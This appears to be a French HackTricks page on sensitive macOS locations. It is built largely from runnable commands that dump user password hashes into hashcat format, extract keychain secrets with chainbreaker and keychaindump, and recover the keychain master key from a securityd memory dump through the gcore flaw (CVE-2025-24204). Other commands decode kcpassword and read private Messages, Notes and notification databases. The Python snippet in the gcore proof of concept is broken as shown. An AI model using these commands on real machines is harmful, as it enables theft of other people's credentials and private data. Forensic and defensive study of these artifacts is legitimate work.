# Emplacements sensibles macOS & démons intéressants

{{#include ../../../banners/hacktricks-training.md}}

## Mots de passe

### Mots de passe Shadow

Le mot de passe shadow est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
La commande en une ligne suivante peut être utilisée pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hash) :
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transformer le hash au **format** **hashcat**.

Une autre ligne de commande qui videra les identifiants de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Une autre façon d’obtenir le `ShadowHashData` d’un utilisateur est d’utiliser `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ce fichier est **uniquement utilisé** lorsque le système démarre en **single-user mode** (donc pas très fréquemment).

### Keychain Dump

Notez que lorsque l’on utilise le binaire security pour **dump les mots de passe déchiffrés**, plusieurs invites demanderont à l’utilisateur d’autoriser cette opération.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Sur macOS moderne, les backing stores les plus intéressants sont généralement **`~/Library/Keychains/login.keychain-db`** et **`/Library/Keychains/System.keychain`**. Ce sont des fichiers basés sur SQLite, mais l’accès en clair reste médié par **`securityd`** : voler la base brute vous donne surtout des métadonnées et des blobs chiffrés, sauf si vous récupérez aussi le mot de passe de l’utilisateur, `SystemKey`, ou une master key en mémoire.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> D’après ce commentaire [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), il semble que ces outils ne fonctionnent plus sur Big Sur.

### Keychaindump Overview

Un outil nommé **keychaindump** a été développé pour extraire des mots de passe depuis les keychains macOS, mais il rencontre des limites sur les versions plus récentes de macOS comme Big Sur, comme indiqué dans une [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L’utilisation de **keychaindump** exige que l’attaquant obtienne un accès et élève ses privilèges à **root**. L’outil exploite le fait que la keychain est déverrouillée par défaut à la connexion de l’utilisateur, pour des raisons de commodité, ce qui permet aux applications d’y accéder sans demander le mot de passe de l’utilisateur à répétition. Cependant, si un utilisateur choisit de verrouiller sa keychain après chaque utilisation, **keychaindump** devient inefficace.

**Keychaindump** fonctionne en ciblant un processus spécifique appelé **securityd**, décrit par Apple comme un daemon pour les opérations d’autorisation et de cryptographie, crucial pour accéder à la keychain. Le processus d’extraction consiste à identifier une **Master Key** dérivée du mot de passe de connexion de l’utilisateur. Cette clé est indispensable pour lire le fichier de keychain. Pour localiser la **Master Key**, **keychaindump** analyse le heap mémoire de **securityd** avec la commande `vmmap`, à la recherche de clés potentielles dans des zones marquées `MALLOC_TINY`. La commande suivante est utilisée pour inspecter ces emplacements mémoire :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Après avoir identifié des master keys potentielles, **keychaindump** recherche dans les heaps un motif spécifique (`0x0000000000000018`) qui indique un candidat pour la master key. D’autres étapes, y compris la deobfuscation, sont nécessaires pour utiliser cette clé, comme indiqué dans le code source de **keychaindump**. Les analystes qui se concentrent sur ce domaine doivent noter que les données cruciales pour déchiffrer le keychain sont stockées dans la mémoire du processus **securityd**. Une commande d’exemple pour exécuter **keychaindump** est :
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants depuis un keychain OSX de manière forensiquement fiable :

- Mot de passe de keychain haché, adapté au cracking avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Avec le mot de passe de déverrouillage du keychain, une master key obtenue à l'aide de [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage comme SystemKey, Chainbreaker fournira aussi les mots de passe en clair.

Sans l'une de ces méthodes de déverrouillage du Keychain, Chainbreaker affichera toutes les autres informations disponibles.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extraire les clés du trousseau (avec les mots de passe) en cassant le hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extraire les clés du keychain (avec mots de passe) avec un memory dump**

[Suivez ces étapes](../index.html#dumping-memory-with-osxpmem) pour effectuer un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Si vous connaissez le mot de passe de l’utilisateur, vous pouvez l’utiliser pour **dump et déchiffrer les keychains qui appartiennent à l’utilisateur**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Clé principale du Keychain via l’entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) a livré `/usr/bin/gcore` avec l’entitlement **`com.apple.system-task-ports.read`**, donc n’importe quel admin local (ou app signée malveillante) pouvait dumper **la mémoire de n’importe quel processus même avec SIP/TCC appliqués**. Dumper `securityd` leak la **clé principale du Keychain** en clair et permet de déchiffrer `login.keychain-db` sans le mot de passe de l’utilisateur.

**Repro rapide sur les builds vulnérables (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Alimentez la clé hex extraite à Chainbreaker (`--key <hex>`) pour déchiffrer le trousseau de connexion. Apple a supprimé l’entitlement dans **macOS 15.3+**, donc cela ne fonctionne que sur des builds Sequoia non patchés ou sur des systèmes ayant conservé le binaire vulnérable.

### kcpassword

Le fichier **kcpassword** est un fichier qui contient le **mot de passe de connexion de l’utilisateur**, mais seulement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l’utilisateur sera connecté automatiquement sans qu’un mot de passe lui soit demandé (ce qui n’est pas très sûr).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xoré avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe des utilisateurs est plus long que la clé, la clé sera réutilisée.\
Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Avant **Sequoia**, vous pouvez généralement trouver le stockage du Notification Center dans **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Dans **Sequoia+**, Apple l’a déplacé vers le container de groupe protégé par TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La plupart des informations intéressantes sont stockées dans des colonnes **blob**, donc vous devrez extraire ce contenu et le transformer en quelque chose de lisible par un humain (`plutil -p -`, `strings`, ou un petit parser). Exemples de triage rapide:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Problèmes récents de confidentialité (NotificationCenter DB)

- Sur macOS **14.7–15.1**, Apple stockait le contenu des bannières dans le SQLite `db2/db` sans masquage approprié. Les CVE **CVE-2024-44292/44293/40838/54504** permettaient à n’importe quel utilisateur local de lire le texte des notifications d’autres utilisateurs en ouvrant simplement la DB (aucune invite TCC).
- Apple a atténué cela en déplaçant la DB dans `group.com.apple.usernoted` et en la protégeant avec TCC dans les versions plus récentes de Sequoia, donc sur les systèmes actuels il faut normalement le bon contexte utilisateur ou un TCC bypass pour la lire.
- Sur les endpoints legacy, copiez ensemble les fichiers `db`, `db-wal` et `db-shm` avant une mise à jour ou un redémarrage si vous voulez préserver les artefacts.

### Notes

Les **notes** des utilisateurs peuvent être trouvées dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Si la one-liner ci-dessus est trop bruyante, exportez `ZICNOTEDATA.ZDATA`, décompressez-le avec gunzip, puis parsez le protobuf : c’est généralement plus fiable que d’exécuter `strings` directement sur la SQLite.

### Background Tasks / Login Items

Depuis **Ventura**, les login items approuvés par l’utilisateur et plusieurs background tasks sont suivis dans des stores **BTM** tels que **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** et le cache système versionné **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ces fichiers sont utiles pour identifier rapidement la persistence, les helper tools et certains background items gérés par MDM :
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
For the persistence angle and BTM internals, check [the auto-start locations page](../../macos-auto-start-locations.md#login-items) and [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Dans les apps macOS, les préférences se trouvent dans **`$HOME/Library/Preferences`** et, sur iOS, dans `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Sur macOS, l’outil CLI **`defaults`** peut être utilisé pour **modifier le fichier Preferences**.

**`/usr/sbin/cfprefsd`** revendique les services XPC `com.apple.cfprefsd.daemon` et `com.apple.cfprefsd.agent` et peut être appelé pour effectuer des actions telles que modifier les préférences.

## OpenDirectory permissions.plist

Le fichier `/System/Library/OpenDirectory/permissions.plist` contient les permissions appliquées aux attributs de nœud et est protégé par SIP.\
Ce fichier accorde des permissions à des utilisateurs spécifiques par UUID (et non par uid) afin qu’ils puissent accéder à des informations sensibles spécifiques comme `ShadowHashData`, `HeimdalSRPKey` et `KerberosKeys` entre autres :
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notifications système

### Notifications Darwin

Le démon principal pour les notifications est **`/usr/sbin/notifyd`**. Afin de recevoir des notifications, les clients doivent s’enregistrer via le port Mach `com.apple.system.notification_center` (vérifiez-les avec `sudo lsmp -p <pid notifyd>`). Le démon est configurable avec le fichier `/etc/notify.conf`.

Les noms utilisés pour les notifications sont des notations DNS inversées uniques, et lorsqu’une notification est envoyée à l’un d’eux, le ou les clients qui ont indiqué pouvoir la gérer la recevront.

Il est possible de dumper l’état actuel (et de voir tous les noms) en envoyant le signal SIGUSR2 au processus notifyd et en lisant le fichier généré : `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Le **Distributed Notification Center** dont le binaire principal est **`/usr/sbin/distnoted`**, est une autre façon d’envoyer des notifications. Il expose certains services XPC et effectue quelques vérifications pour tenter de valider les clients.

### Apple Push Notifications (APN)

Dans ce cas, les applications peuvent s’enregistrer pour des **topics**. Le client générera un token en contactant les serveurs d’Apple via **`apsd`**.\
Ensuite, les providers auront également généré un token et pourront se connecter aux serveurs d’Apple pour envoyer des messages aux clients. Ces messages seront reçus localement par **`apsd`** qui relaiera la notification à l’application qui l’attend.

Les préférences se trouvent dans `/Library/Preferences/com.apple.apsd.plist`.

Il existe une base de données locale des messages située dans macOS dans `/Library/Application\ Support/ApplePushService/aps.db` et dans iOS dans `/var/mobile/Library/ApplePushService`. Elle comporte 3 tables : `incoming_messages`, `outgoing_messages` et `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Il est également possible d’obtenir des informations sur le daemon et les connexions en utilisant :
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifications utilisateur

Voici des notifications que l’utilisateur devrait voir à l’écran :

- **`CFUserNotification`** : Ces API fournissent un moyen d’afficher à l’écran une pop-up avec un message.
- **The Bulletin Board** : Cela affiche dans iOS une bannière qui disparaît et sera stockée dans le Notification Center.
- **`NSUserNotificationCenter`** : C’est le Bulletin Board d’iOS dans MacOS. Sur les anciennes versions de macOS, la base de données se trouve généralement dans `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; sur Sequoia+, elle a été déplacée vers `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
